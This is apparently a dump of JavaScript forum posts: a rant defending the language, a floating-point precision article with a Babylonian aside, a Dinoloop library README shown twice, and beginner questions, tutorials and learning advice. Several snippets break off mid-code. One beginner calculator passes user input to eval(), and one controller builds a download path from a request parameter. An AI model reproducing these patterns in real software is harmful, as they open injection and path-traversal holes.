""global variables""|What's there to complain here? A bunch of idiots forgot to *declare* variables, so instead of throwing errors everywhere, the kind browser decides to *not make you go cry in a corner* and add it to the global object, *instead of fucking breaking your page.* It's *your* fault for forgetting to declare your variables, stop blaming it on the language/runtime.
""First-class functions""|How is this a bad thing? Currying, callbacks, etc. etc. etc. So many good things, and you're complaining about *this*?
""No multithreading""| Refer to above argument against memory management

Did I miss anything out? Tell me in the comments!

Oh yeah, the TL;DR:    
- Polyfills and cool mutations (in a classical language, tell me if you can extend a class after writing it and moving on to its object instance, eh?)
- Awesome cool stuff like `.apply`ing arguments to a *constructor* (you can't `.apply` with the new operator)
- Multiple inheritance (Yeah, baby)
- ""Abstract class"" ""Interface"" ""Enum"" ""Struct"" -&gt; no clusterfuck, just `Object.prototype.whateverYouWant` (just don't abuse this, please)

Have I missed anything?

This is an article about how computers view information, why we sometimes end up with unexpected results, and also about ancient Babylon. No, really.

I wrote it after seeing a click-bait ad, that showed a snippet of code and said something along the lines of ""9 out of 10 developers get this wrong."" The intended audience of this article are beginners, junior developers and mid-level developers. Seniors should know all of this by heart already. Except maybe the Babylon part. I won't judge you if you don't know that bit.

Anyway, let's begin.

As we all know, computers are precise but not intelligent. A computer can never guess what you meant when you gave it a certain command. It will, however, execute that command with utmost diligence and precision. In other words, if a computer is doing something other than what you asked it do to, you are simply asking it wrong.

##What nonsense!

Sometimes, we encounter situations when some pretty weird stuff is happening. For example, let us create two variables and compare their values.

    const x = 1/3;
    const y = 1/3 + 100 - 100;

It is self evident to any normal person, that ```x``` and ```y``` should be equal, since adding 100 and then subtracting that same 100 from any number, should result in the original number.

Let's see what a computer thinks about this:

    x === y;    // false

What the! Why? Maybe the computer is broken. Or this programming language was created by drunken sailors. Before we toss our PC and quit programming, though, let's first take a look at why exactly they aren't equal. Let's see what these variables actually contain.

    console.log(x);    // 0.3333333333333333
    console.log(y);    // 0.3333333333333286

Well, damn. They aren't equal after all. But how did this happen? Why did adding and subtracting 100 have such a strange effect?

To answer this question we need to figure out how computers perceive information, specifically numbers.

##Nothing magical here.

In the simplest of terms a computer is just a collection of transistors. A transistor is a device that can either conduct electricity or ... not conduct it. That's because it's made from a semiconductor material. Basically, if you have a transistor, you can make it output some electronic signal (we can refer to it as 1) or nothing at all (which we can refer to as 0.)

One such piece of information is called a bit. If we have a single bit to work with, it could contain either a 1 or a 0. If we have two bits, we get a few more combinations: 00, 01, 10, and 11. And then so on and so forth. Eight bits form one byte.

##Looking from another angle.

So if the computer only understands these ones and zeroes, how does it see our numbers, the ones humans are used to? It sees them as mere combinations of ones and zeroes. In our day to day life we usually deal with 10-based notation. First we have single units, then we have tens, then hundreds, etc. A number 42 can be seen as:

    tens:    4
    singles: 2

And if we add another 8, then we'll have ten singles, in other words one more ten. As a result we'll end up with five tens and zero singles.

---


&gt; *A bit of a distraction: a 10-based system is not the only one, nor is it in any way special or exclusive to all people. A system can be created based on any natural number. For example, in ancient Babylon they used a system that was based on 60 not on 10. That's why we still have 360 degrees in a circle and 60 seconds in a minute.*

&gt; *Where did it come from? Quite simple. Much like us, they liked to count on their fingers. Except unlike us, they counted not the fingers themselves, but the phalanges in each finger. We have 12 of those on each hand (excluding the thumb, which they instead used for counting.) And since there are 5 fingers on each hand, 12 * 5 = 60. This really isn't anymore odd than our own way. Just a different tradition. In fact they would probably find it very weird that we are only counting to 5 on one hand, instead of to 60.*

---


The computer does exactly the same thing as we do, but in a 2-based (or binary) notation. Instead of singles, tens, and hundreds, it's using singles, twos, fours, etc.

    0000: 0 (zero single)                     0100: 4 (one four)
    0001: 1 (one single)                      0101: 5 (one four and one single) 
    0010: 2 (one two)                         0110: 6 (one four and one two)  
    0011: 3 (one two and one single)          0111: 7 (one four, one two, and one single)

##Now it gets better.

As we can see, while having only 4 bits we can count from 0 to 15. In other words, 4 bits can contain one of 16 different values. And if given 1 byte (8 bits,) we could express any one of 256 different values.

Since most computers these days are based on either the 32-bit or the 64-bit architecture, the majority of programming languages dedicate exactly that many bits to simple numeric variables.

So let's get back to our example.

The fraction 1/3, when recorded as a decimal, looks like 0.3333333333... and so on for infinity. We usually shorten it to something like 0.33 just so save some space. A computer is also forced to shorten infinite numbers. In this case it's done in a very simple manner. It just stores however many digits can fit into 64 bits.

Earlier, when we logged our values, we saw that 1/3 looks like ```0.3333333333333333``` and now we know that this is because only so many symbols could fit into a 64-bit variable. In binary it looks like this: ```0.010101010101010101010101010101010101010101010101010101```.

##The jist of the matter.

And here we are, this is the reason we were looking for. If we were to add 100 we would then need more bits to store it, since 100 in binary looks like: ```1100100```. (That's one 64, one 32, and one 4.)

The thing is there aren't any bits left. We filled them all. This forces the computer to lose a few bits at the end. Our number now looks like this: ```1100100.0101010101010101010101010101010101010101010101```.

Now let's subtract the 100 back. That's simple enough. However, all those digits at the end, which we lost earlier, are gone. Forever. There's nothing we can do to recover them at this point. All those bits will remain free, and we will end up with this: ```0.0101010101010101010101010101010101010101010101```.

Conceptually ```0.0101010101010101010101010101010101010101010101``` is still pretty damn precise. We can easily round it to 0.33, since in decimal notation it's that very ```0.3333333333333286```, which confused us in the beginning. We really didn't lose all that much. But, as we mentioned in the very beginning, computers execute all our commands with precision and diligence. That is why, if you ask a computer to compare these two values:

    0.010101010101010101010101010101010101010101010101010101
    0.0101010101010101010101010101010101010101010101

it will, quite understandably, report back that they are unequal.

##That's all, folks!

The computer works well and the programming language seems to be doing its job as well. And we took a moment to remember the ancient Babylon, so overall this was a good day. =) I hope this article helped someone gain a better understanding of computers and programming.

Although instanceof can identify arrays, there is one exception that affects

web developers: JavaScript values can be passed back and forth between

frames in the same web page. This becomes a problem only when you try

to identify the type of a reference value, because each web page has its

own global context—its own version of Object , Array , and all other built-

in types. As a result, when you pass an array from one frame to another,

instanceof doesn’t work because the array is actually an instance of Array

from a different frame.

To solve this problem, ECMAScript 5 introduced Array.isArray() ,

which definitively identifies the value as an instance of  Array regardless

of the value’s origin. This method should return true when it receives

a value that is a native array from any context. If your environment is

ECMAScript 5 compliant, Array.isArray() is the best way to identify arrays:

var items = \[\];

console.log(Array.isArray(items));

// true  


isArray() will ultimately be found in Array prototype, right? so, why can't we just use items.isArray() ?",Why Array.isArray(items) and not items.isArray() ?

Sorry for making it too vague and I have created a new article explaining in detail. Please spend your time on it and let me know your thoughts on it.

[Dinoloop ](https://github.com/ParallelTask/dinoloop)is an [ExpressJs](https://expressjs.com/) library, completely written in Typescript project designed to build REST APIs. Dinoloop adds syntactic sugar to expressjs enabling C#/Java programmers to easily switch to Nodejs with zero or less learning curve. You can reuse OOP, SOLID principles, Controllers, Services, Well-Proven OOP Design Patterns in Nodejs while developing REST APIs using Dinoloop.

## Prerequisites

* node 8.10.x or higher
* express 4.x.x or higher

## Getting Started

Dinoloop has been designed from the start for gradual adoption and you can use as little or as much dinoloop as you need. Perhaps you only want to develop some ""REST APIs"" using dinoloop and other REST APIs can be developed using [expressjs](https://expressjs.com/). In this section, we will show how to create dinoloop REST API to an existing or newly created express app.

## Step 1: Add HomeController (file: home.controller.ts)

    import { ApiController, Controller, HttpGet, SendsResponse } from 'dinoloop'; 
    
    @Controller('/home') 
    export class HomeController extends ApiController {  
       
       @HttpGet('/get')     
       get(): string {         
          return 'Hello World!';     
       }
       
       // Value injection framework, injects segments into action-args
       @SendsResponse()
       @HttpGet('/download/file/:id')
       name(id: string): void {
         
         // this.request is express.request object
         let headers = this.request.headers;
         
         // this.response is express.response object
         this.response.download('file.txt');
       } 
    }

## Step 2: Mount dinoloop and bind to express instance (file: app.ts)

    import { Dino } from 'dinoloop';
    import express = require('express');
    
    const app = express(); 
    
    // Dino requires express instance and base-Uri
    const dino = new Dino(app, '/api');  
    
    // Dino requires express router too 
    dino.useRouter(() =&gt; express.Router());  
    
    // Register controller 
    dino.registerController(HomeController);  
    
    // Binds dino to express 
    dino.bind(); 
    
    // These are your normal express endpoints 
    app.get('/home', (req, res, next) =&gt; {  res.status(200).json('Hello World!'); });  
    app.get('/about', (req, res, next) =&gt; {  res.status(200).json('Hello World!'); });  
    
    // Start your express app 
    app.listen(8088, () =&gt; console.log('Server started on port 8088'));

Dinoloop is mounted on /api and all of the controller routes/endpoints which are registered with dinoloop are also mounted on /api. Dinoloop will handle /api/home/get requests since it is mounted on /api. The other end points /home and  /about which are created by expressjs are not handled by dinoloop, this way you can slowly migrate your existing express app to dinoloop or you can start writing your new REST APIs using dinoloop in combination with express.

## Features

* Super easy set-up, git clone your taste of starter project  and start building right away. We want our developers to have freedom whether to use DI or not. You can develop API without using DI framework.

1. Without DI framework [dinoloop-starter-without-DI](https://github.com/ParallelTask/dinoloop-starter)
2. With DI framework [dinoloop-starter-with-DI](https://github.com/ParallelTask/dinoloop-inversify-starter)

* Supports express middlewares, completely express compatible.
* Heavily influenced by MVC pattern.
* Configurable Dependency injection support, Works with and Without DI. You can choose your favorite DI framework [InversifyJs](http://inversify.io/), [peppermint-di](https://www.npmjs.com/package/peppermint-di) and [more](https://www.npmjs.com/search?q=DI) to work with.
* Proper isolation of controllers and services.
* Middlewares, ActionFilters, ExceptionFilters, ResultFilters at controller level.
* Robust Sync/Async middlewares to handle es6 async-await pattern.
* UserIdentity principal across request.

## Motivation

Typescript (*Javascript now*) supports object oriented programming, these features are great with SOLID design principles. Dinoloop has simple motto, to apply SOLID principles and reuse similar coding skills of Java and C# in Nodejs.

## Philosophy

Dinoloop lets user to freely upgrade/downgrade expressjs. Installing dinoloop won't install express. You can install your own version of express. All you have to provide is express app, express router instance to dinoloop.

## Questions raised by our community

## Dinoloop looks pretty new, Should I use it?

As a contributor, we would definitely request you to give it a try (May be your personal or mini sized projects). The way expressjs does not abstract you from node, Dinoloop does not abstract you from expressjs. You are free to use/mix node, express and dinoloop in your development. Indeed 99&amp;#37; of code you write would be purely node, typescript and express. Dinoloop is a library at server-side (like [Reactjs](https://reactjs.org/), we love what Reactjs does at client-side). You can either develop entire application in Dinoloop or part of it or gradually migrate expressjs to Dinoloop. The first principle of Dinoloop is to provide architecture shift to developers and not to create a complete huge framework because we do not want our developers to run into issues because of dinoloop, we love and support pluggable architecture.

## Typescript for Node, Seems pretty new?

We love Typescript and it provides great tooling to develop enterprise applications. [Angular](https://angular.io/) promotes typescript and now it is hard to imagine npm packages without types. If you are a lover of angular (like us), we highly suggest you to use Dinoloop to maintain single Typescript codebase for [MEAN](http://mean.io/) application.

We appreciate the simplicity of javascript and we do not want to enter a debate with functional javascript programmers. The motto of Dinoloop is to help some community of developers to switch NodeJs easily and reuse existing coding skills and we are not trying to make every Nodejs developer as OOP programmer, we are providing the same architecture for the java/c# and mostly OOP minded programmers. We love javascript the way it is &lt;3. ",Dinoloop - REST API Expressjs library for Nodejs powered by Typescript with OOP and SOLID principles

I have created a library to solve this problem (learning curve) faced by many of the C# developers like me.It was all started when I have chose [MEAN](http://mean.io/) development for my self project. It was pretty tough for me to understand the simplicity of Node/Express. The main problems I have faced

1. No strong typing with javascript (compile time errors missed).
2. No classes, interfaces, abstract classes (I am favorite of OOP and functional as well).
3. No architecture to follow while developing express application.
4. Requires understanding of javascript fundamentals for seperation of concerns and creating scalable architecture.
5. No concept of controllers and services (preferably MVC, You can create your own architecture).
6. No SOLID principles and Dependency Injection in javascript world.
7. Unable to Reuse my strong OOP skills and Well-Proven OOP design patterns in Node.
8. Testing was quite difficult to understand in initial days using fakes, spies and stubs in javascript world.

Having seen the pain points of using express/node, I have created [Dinoloop](https://github.com/ParallelTask/dinoloop). ExpressJs is great, we love its simplicity for creating REST APIs but scaling your enterprise application with expressjs might end up difficult for inexperienced developers. Dinoloop solves the problems I have discussed above. You also have great support for testing through Mocks and Dependency Injection. Adding to that Dinoloop is heavily inspired by [Asp.Net](https://Asp.Net) WebAPI, most of the syntax is similar/represents WebAPI and its concepts.

      // Value injection framework, injects segments into action-args

      name(id: string): void {

         let headers = this.request.headers;
    
         // this.response is express.response object
         this.response.download(id + 'file.txt');
      } 
    }

    dino.bind(); 
    
    // These are your normal express endpoints 
    app.get('/home', (req, res, next) =&gt; {  res.status(200).json('Hello World!'); });  
    app.get('/about', (req, res, next) =&gt; {  res.status(200).json('Hello World!'); });  
    
    // Start your express app 
    app.listen(8088, () =&gt; console.log('Server started on port 8088'));

Dinoloop is mounted on /api and all of the controller routes/endpoints which are registered with dinoloop are also mounted on /api. Dinoloop will handle /api/home/get requests since it is mounted on /api. The other end points /home and  /about which are created by expressjs are not handled by dinoloop, this way you can slowly migrate your existing express app to dinoloop or you can start writing your new REST APIs using dinoloop in combination with express.

## Motivation

Typescript (*Javascript now*) supports object oriented programming, these features are great with SOLID design principles. Dinoloop has simple motto, to apply SOLID principles and reuse similar coding skills of Java and C# in Nodejs.

## Philosophy

Dinoloop lets user to freely upgrade/downgrade expressjs. Installing dinoloop won't install express. You can install your own version of express. All you have to provide is express app, express router instance to dinoloop.

## Questions raised by our community

## Dinoloop looks pretty new, Should I use it?

As a contributor, we would definitely request you to give it a try (May be your personal or mini sized projects). The way expressjs does not abstract you from node, Dinoloop does not abstract you from expressjs. You are free to use/mix node, express and dinoloop in your development. Indeed 99&amp;#37; of code you write would be purely node, typescript and express. Dinoloop is a library at server-side (like [Reactjs](https://reactjs.org/), we love what Reactjs does at client-side). You can either develop entire application in Dinoloop or part of it or gradually migrate expressjs to Dinoloop. The first principle of Dinoloop is to provide architecture shift to developers and not to create a complete huge framework because we do not want our developers to run into issues because of dinoloop, we love and support pluggable architecture.

## Typescript for Node, Seems pretty new?

We love Typescript and it provides great tooling to develop enterprise applications. [Angular](https://angular.io/) promotes typescript and now it is hard to imagine npm packages without types. If you are a lover of angular (like us), we highly suggest you to use Dinoloop to maintain single Typescript codebase for [MEAN](http://mean.io/) application.

We appreciate the simplicity of javascript and we do not want to enter a debate with functional javascript programmers. The motto of dinoloop is to help some community of developers to switch NodeJs easily and reuse existing coding skills and we are not trying to make every Nodejs developer as OOP programmer, we are providing the same architecture for the java/c# and mostly OOP minded programmers.

I one sentence, my app is a WebRTC video conference, using a WebSocket (as a singleton/global), which updates a redux store, which props into the React view.

The project is starting to get big and I'm getting really confused about representing **application state** **data** in my store. I'm aware that React is a view level framework and do not force in any way. I also probably read every blog post out there on this topic, but couldn't get to a conclusion - so thought to ask over here.

1. React/Redux really promotes the idea of using vanilla javascript objects to represent data, but as my application gets bigger, my models are starting to get mixed up. For example, a user model may be a local user, remote user or a 3rd party service user (say Twilio). In any other platform, I would create 3 models and inherit from a base User model and manage an array of the base User model, but I understand that's not how traditionally JS works. I don't want to follow back to the MVC trap, but really confused on how am I suppose to distinguish between different objects only by looking at their flat data and not on their type.
2. Most of my application state is receiving updates on the WS object, then copied to the redux state (using callbacks). I'm aware of the state duplication but could not figure out a better way to manage a stateful object inside a stateless data store. Would love to get some feedback here.

1766,2018-07-19 14:41:37,1,1,"I'm working on an issue where a page is getting a timestamp from an AJAX call and using formatDate() to display it to the user, that's all nice and good until we saw that the displayed time is 2 hours behind.

At first I thought this was a matter of system time, javascript being clientside and all where else would it get it's timezone information, but that doesn't seem to be the case. Even if do a console.log(new Date()) in firefox it claims it's two hours earlier than my system clock.

Previous developers had an unfortunate habbit of adding or substracting hours to timestamps because they didn't know how to deal with timezones and / or daylight saving times so I figured something like that was going on, like a setDefaultTimezone(- 2 hours) or whatever that then affects all future calls to the Date object.

Except as far as I can tell... there is no such thing as a setDefaultTimezone call in javascript, or at the very least, no such mention of it is in the entire project.

What could possibly be causing new Date() to be claiming it's two hours earlier than it's supposed to be?","Wrong time / timezone is being set, but how?"

1768,2018-07-20 12:52:04,3,1,"Hello all, noob here. Struggling through some issues with Cloudflare. I'm attempting to use their ""Workers"" service to run javascript for URL redirection. They charge $1/month for each redirection rule, and I have over 90. Quite an expensive monthly cost! 

Long story short, due to my current e-commerce platform, I must use Cloudflare for my SSL provider. 

I've gotten this to perform a redirect as I want, but I'm not fully understanding the syntax:

*addEventListener('fetch', event =&gt; {*  
 *let url = new URL(event.request.url);*  
 *if (url.pathname.includes (""/test"")) {*  
*event.respondWith(redirectTo(event.request));*  
  *} else {*  
 *return new Response(""Something didn’t quite work"");*  
  *}*  
*});*  
*async function redirectTo(request) {*  
 *return Response.redirect('*r/https://www.google.com*');*  
*}*

So in this example, if I navigate to mydomain/test, I am redirected to Google's homepage. My question is, can I possibly perform this multiple times for each redirection instance that I want in place? If I duplicate this code again, only the last async is executed, so obviously I am incorrectly assuming the function. I'm certainly open to better ideas, as well.

I've mostly recreated this application (albeit with some changes to names to some classes, as the data I want is different). But I'm encountering a weird issue.

**Problem 1:** The data I'm getting from the Database never changes for the lifetime of the application. I literally have to stop the application and restart it to get new data. It's as if the data is being cached, but I don't think I'm caching it? (Am I missing a change to the database?) The service broker is enabled, I verified that.

**Problem 2:** In addition the `dependency.OnChange` event in the SQL Dependency never fires, I'm assuming this is related to the first issue. I make a change to the database from SQL Server Management studio and the dependency.OnChange event doesn't fire.

I'm assuming that **Problem 2** is being caused by **Problem 1**.

I don't know what I need to check. I need to make sure that my headers are the same as the manual ones and that I pass along any cookies I get from the login request to every subsequent request. Don't I do that?

There is an enormous string at the bottom of the Fiddler data for the second POST I am trying to replicate that I have no idea what it means or where it came from. That is a piece of the puzzle I am missing too. It starts out with this:

`{""resourcetime"":[{""rtUrl"":""`

and then goes on and on and on with a bunch of gibberish I can't share without clogging up this post even more.

I've been at this task for almost a week now, and still cannot get past this login page. I could really use some guidance, even if it's just a push in the right direction.

I already feel there are so many of my javascript skills I have to solidify, so the thought of having to learn Java or php or asp.net is exhausting. If I had my druthers I'd learn react native and electron and really just focus on JavaScript, learn advanced node.js and read Kyle Simpson over and over.

Instead its 5+5 (hit equal) 5+5null. the error in mmy console reads a unexpected or invalid token on the js line with the eval function. I'm copying the code from a tutorial and its the exact same, any help would be greatly appreciated. Thanks.

const btns = document.querySelectorAll('.num');

const screen = document.querySelector('.screen');

const equal = document.querySelector('.btn-equal');

const clear = document.querySelector('btn-clear');

for (let i = 0; i &lt; btns.length; i++) {

    btns\[i\].addEventListener('click', function () {
    
    	let number = btns\[i\].getAttribute('data-num');

}

equal.addEventListener('click', function() {

    let value = eval(screen.value);
    
    screen.value = value;

1803,2018-07-31 05:17:25,2,4,"Hello Everyone,

I have been experimenting on Tensorflow.js for sometime , I would like to Share my Learnings with the Community.

We know that An increasing number of developers are using TensorFlow in their machine learning projects. In March this year, the TensorFlow team at Google announced the arrival of the much-awaited JavaScript framework, TensorFlow.js (which was previously called DeepLearn.js).

Now developers can build lightweight models and run them in the browser using JavaScript. Let’s understand what the need was for the development of this framework.

## History

Before going to TensorFlow.js, I would like to start off with TensorFlow.

TensorFlow was developed in 2011 at Google as their propitiatory library for Machine learning/Deep learning applications at Google. This library was open sourced in 2015 under the Apache License.

TensorFlow is built in C++, which enables the code to execute at a very low level. TensorFlow has bindings to different language like Python, R, &amp; Java. This enables TensorFlow to be used in these languages.

So, the obvious question is: what about JavaScript?

Conventionally, in JavaScript, ML/DL was performed by using an API. An API was made using some framework, and the model was deployed at the server. The client sent a request using JavaScript to get results from the server.

[Client Server Architecture](https://i.redd.it/xalftcdbw7d11.png)

In 2017, a project called Deeplearn.js appeared, which aimed to enable ML/DL in JavaScript, without the API hassle.

But there were questions about speed. It was very well known that JavaScript code could not run on GPU. To solve this problem, WebGL was introduced. This is a browser interface to OpenGL. WebGL enabled the execution of JavaScript code on GPU.

In March 2018, the DeepLearn.js team got merged into the TensorFlow Team at Google and was renamed TensorFlow.js.

Watch the below video for further details:

[https://youtu.be/qa1OXssGBHw](https://youtu.be/qa1OXssGBHw)

## TensorFlow.js

Tensorflow.js provides two things:

* The CoreAPI, which deals with the low level code
* LayerAPI is built over the CoreAPI, and makes our lives easier by increasing the level of abstraction.

## Getting Started

There are two main ways to get TensorFlow.js in your project:

## 1. via &lt;script&gt; Tag

Add the following code to an HTML file:

    &lt;html&gt;
    &lt;head&gt;
      &lt;!-- Load TensorFlow.js --&gt;
        &lt;script src=""https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@0.12.0""&gt; &lt;/script&gt;
      &lt;/head&gt;
        &lt;body&gt;
          Hello
      &lt;/body&gt;
    &lt;/html&gt;

## 2. via NPM

Add TensorFlow.js to your project using yarn or npm.

    yarn add @tensorflow/tfjs  
     npm install @tensorflow/tfjs    

In your main js file:

    import * as tf from '@tensorflow/tfjs';    

## CoreAPI

## 1. Tensors

So, what is a Tensor ?

[Visual Representation of Scalar,Vector,Matrix and Tensor](https://i.redd.it/j5dld2y4w7d11.jpg)

A scalar is a single number. For example, x = 1

* A vector is an array of numbers. For example, *x*=\[1,2\]
* A matrix is a 2-D array =&gt; (\[\[1, 2\], \[3, 4\], \[5, 6\]\])
* A tensor is a \*n-\*dimensional array with *n*\&gt;2

TensorFlow.js has utility functions for common cases like Scalar, 1D, 2D, 3D and 4D tensors, as well a number of functions to initialize tensors in ways useful for machine learning.

## Code Examples

**tf.tensor():**

    // Pass an array of values to create a vector.   
     tf.tensor([1, 2, 3, 4]).print();   

**tf.scalar():**

    tf.scalar(3.14).print();    

And so on…

Watch the Below Video to get a deep insight into Tensors in TensorFlow.js:

[https://youtu.be/sZrwxnIfHCo](https://youtu.be/sZrwxnIfHCo)

## 2. Variables &amp; Operations

Tensors are immutable data structures. That means their values can’t be changed once they are set.

However, tf.variable()is introduced in TensorFlow.js. The real use case for tf.variable()is when we need to change the data frequently, such as when adjusting model weights in Machine Learning.

Code sample:

    const x = tf.variable(tf.tensor([1, 2, 3]));  
      x.assign(tf.tensor([4, 5, 6]));   
     x.print();    

## Operations

There are various operations in TensorFlow.js. In order to perform mathematical computation on Tensors, we use operations. Tensors are immutable, so all operations always return new Tensors and never modify input Tensors. So tf.variable()can be used in order to save memory.

Let’s look into some operations:

**tf.add() — Adds two** [**tf.Tensor**](https://js.tensorflow.org/api/0.12.0/#class:Tensor)**s element-wise**

    const a = tf.tensor1d([1, 2, 3, 4]);   
     const b = tf.tensor1d([10, 20, 30, 40]);   
     a.add(b).print();  // or tf.add(a, b)    

There are many operations in TensorFlow.js. You can check the [documentation](https://js.tensorflow.org/api/0.12.0/#Operations)for other operations. I will demonstrate one more operation here: **tf.matmul()**

**tf.matmul() — Computes the dot product of two matrices, A \* B.**

    const a = tf.tensor2d([1, 2], [1, 2]);   
     const b = tf.tensor2d([1, 2, 3, 4], [2, 2]); 
      a.matMul(b).print();  // or tf.matMul(a, b)    

Watch the below video for deep insight into Variable and Operations:

[https://youtu.be/AP1BmP0BZmQ](https://youtu.be/AP1BmP0BZmQ)

## 3. Memory Management

Memory management is the key in Machine Learning/Deep Learning tasks, because they are generally computationally expensive.

TensorFlow.js provides two major ways to manage memory:

1. tf.dispose()
2. tf.tidy()

They both typically do the same thing, but they do it in different ways.

## tf.tidy()

This executes the provided function function and after it is executed, cleans up all intermediate tensors allocated by function except those returned by function.

tf.tidy() helps avoid memory leaks. In general, it wraps calls to operations in [tf.tidy()](https://js.tensorflow.org/api/0.12.0/#tidy) for automatic memory cleanup.

Code example:

    const y = tf.tidy(() =&gt; {
        // aa, b, and two will be cleaned up when the tidy ends.
    
        const two= tf.scalar(2); 
        const aa = tf.scalar(2); 
        const b = aa.square();
    
        console.log('numTensors (in tidy): ' + tf.memory().numTensors);
    
        // The value returned inside the tidy function will return // through the tidy,     in this case to the variable y. 
    
        return b.add(two); 
    });
    
    console.log('numTensors (outside tidy): ' + tf.memory().numTensors); y.print();

# 

# tf.dispose()

Disposes any [tf.Tensor](https://js.tensorflow.org/api/0.12.0/#class:Tensor)s found within the mentioned object.

Code example:

    const two= tf.scalar(2);    
    two.dispose()    

## LayersAPI

Layers are the primary building block for constructing a ML/DL Model. Each layer will typically perform some computation to transform its input to its output. Under the hood, every layer uses the CoreAPI of Tensorflow.js.

Layers will automatically take care of creating and initializing the various internal variables/weights they need to function. So, basically it makes life easier by increasing the level of abstraction.

We will make a simple example feed forward network using the LayerAPI. The Feed Forward network we will build is as below:

      [0.4,0.5,0.5],

    const y_train = tf.tensor([
      [0.2,0.8],
      [0.9,0.10],
      [0.4,0.6],
      [0.5,0.5]
    ])
    
    //Dummy testing data
    const x_test = tf.tensor([
      [0.9,0.1,0.5]
    ])
    
    train_data().then(function(){
      console.log('Training is Complete');
      console.log('Predictions :');
      model.predict(x_test).print();
    })
    
    async function train_data(){
      for(let i=0;i&lt;10;i++){
      const res = await model.fit(x_train,y_train,epoch=1000,batch_size=10);
       console.log(res.history.loss[0]);
      }
    }

## My take on this

This is excellent for coders who are familiar with JavaScript and are trying to find their way in the ML/DL world!

It makes things a lot simpler for people coming from a non-ML/DL background, but who are looking to understand this field. The use cases for this are many, and I personally think it’s something we need at the moment.

What do you think about TensorFlow.js? Let me know in the comments section below.

So then I went back to php.. But now I'm seeing a lot of this same stuff on the php side of things. I'm seeing frameworks like laravel that create 15 folders in a default app which for my type of work is just creating a spiderweb of complexity that doesn't need to exist. 

Although there are some features of laravel that look appealing such as the templating and easy form creation with crud abilities. I'd be interested  in learning some efficient php improvements for working faster,  but do I need all of the learning overhead or are there easier routes for someone like me that just wants to get my smaller projects done without having to spend 2 days dealing with server and local machine configuring dependencies, which is a big thing that turned me off using node and npm,  or dealing with routing, or having these mvc project patterns,  etc",What is the natural progression from basic php to a framework?

I have two problems with this piece of work. 

a) I can only make this update to the DOM with javascript ES5. client restrictions, probably not an issue in this case.

b)  There are potentially hundreds of keywords to match. 400-500 potential keywords to parse, match and recompile as anchors (if they exist on the page).

I figure the easiest way to do this is to store the keyword matches as a JSON array, and also store the href URL's. The code is pretty simple to get a demo working. I can reduce the number of keyword objects by having multiple terms (plus the primary title) for each match. I can also single out a certain portion of my page to run the match against. (mainColumn).

This is still taking some time to resolve when loading the page. So my question is, assuming that this type of thing shouldn't be done with javascript (and moving on from that point) is there a more efficient way of doing this type of thing? am I missing something that might actually make this a solution we might use because as it stands it;s not.

A high-level overview of the task is to pull down a clients website and strip all of the javascript,  export inline styles to a css file, remove the main content leaving just the headers and the footers, and make sure their are no global css declarations so no styles applied to all a, h, tags, img, ect...

I have everything automated except for removing the main content, and making the global CSS styles more specific.

For example, I have to go in and find where the main content is between the header and footer and delete everything and insert a div tag with a special ID to inject a web app.

Then in the CSS, I have to change all of the global tag declaration to go from ""a {..}"" to ""header a {...}""

I'm not sure if I can do the css manipulation with jquery or cherrio and from my understanding finding the main content on the website is a bigger task than it seems.

If you want to be full a-stack developer fast, start by learning Javascript.   
If you’re not familiar with programming, learning Javascript would take about 2-3 weeks. You can use the following platforms to learn Javascript.   


1. **Learn-js. org**— This is a do-and-see platform. This is a perfect platform for beginners to learn JavaScript. The basics of the language can be well understood. However, advance concepts like Callbacks, Currying, and more, you will have to refer to different blogs.   
Other than this, it’s important to learn using frameworks to understand the application of language to build web applications. So this is a nice platform if you want to get started with JavaScript.
2. **Codecademy**— You can learn to program in JavaScript from scratch. This is, however, who are stepping into coding and are new to coding. This covers basic concepts of JavaScript programming.
3. **W3 Schools**— You can learn basic to advance concepts of JavaScript programming. However, you won’t find language concepts, in case you’re looking to learn them. If you’re aware of the language concepts, this would be a nice platform to practice JavaScript programming.
4. **The Odin project**— This is a comparably new platform. This is a good platform to put your JavaScript programming skills to test doing projects like Tic-Tac-Toe and other generic platforms.
5. **Hacker Rank** — This is a competitive programming platform. You will have the advantage to hone your programming skills. This is a nice platform if you want to become a hardcore programmer.   
Do not expect to learn language concepts. However, this is a great platform to practice JavaScript.
6. **Hacker Earth**—Similar to Hacker Rank. However, this platform has a larger community than Hacker Rank.  

If you’re already familiar with programming, it would take about 2-3 days to learn Javascript. You should focus on the following concepts.   
These are some of the frequently used concepts in JavaScript that you should know well—

1. **Value vs. Reference** — Understand how objects, arrays, and functions are copied and passed into functions. Know that the reference is what's being copied. Understand that primitives are copied and passed by copying the value.
2. **Scope** — Understand the difference between global scope, function scope, and block scope. Understand which variables are available where. Know how the JavaScript engine performs a variable lookup.
3. **Hoisting** — Understand that variable and function declarations are hoisted to the top of their available scope. Understand that function expressions are not hoisted.
4. **Closures** — Know that a function retains access to the scope that it was created in. Know what this lets us do, such as data hiding, memoization, and dynamic function generation.
5. this  
 — Know the rules of this  
 binding. Know how it works, know how to figure out what it will be equal to in a function, and know why it’s useful.
6. new  
 — Know how it relates to object oriented programming. Know what happens to a function called with new  
. Understand how the object generated by using new  
 *inherits* from the function’s prototype  
property.
7. apply  
[, ](https://codeplanet.io/javascript-apply-vs-call-vs-bind/)call  
[, ](https://codeplanet.io/javascript-apply-vs-call-vs-bind/)bind  
 — Know how each of these functions work. Know how to use them. Know what they do to this  
.
8. **Prototypes &amp; Inheritance** — Understand that inheritance in JavaScript works through the \[\[Prototype\]\]  
 chain. Understand how to set up inheritance through functions and objects and how new  
 helps us implement it. Know what the \_\_proto\_\_  
 and prototype  
 properties are and what they do.
9. **Asynchronous JS** — Understand the event loop. Understand how the browser deals with user input, web requests, and events in general. Know how to recognize and correctly implement asynchronous code. Understand how JavaScript is both asynchronous and single-threaded.
10. **Higher Order Functions** — Understand that functions are first-class objects in JavaScript and what that means. Know that returning a function from another function is perfectly legal. Understand the techniques that closures and higher order functions allow us to use.

Next, to be a full-stack Javascript developer, you essentially need to work with Node.js and Express.js ( or any other back-end framework). Since Express.js is the most popular one, you should start with this one. The community is larger than any other framework. You will find good resources and tutorials easily. Essential applications to learn: 

1. Understanding CRUD ( Create, repeat, update, delete)
2. Building REST APIs
3. Setting up server 
4. Cloud deployment ( You can go for AWS/Google cloud. If you go for AWS make sure you get hands-on experience on these— **ec2, s3, route 53,** ) 

You can use **edWisor** for this: [learn Node.js and Express.js while working on live projects. ](https://edwisor.com/career-meanstack?ref=redP)    
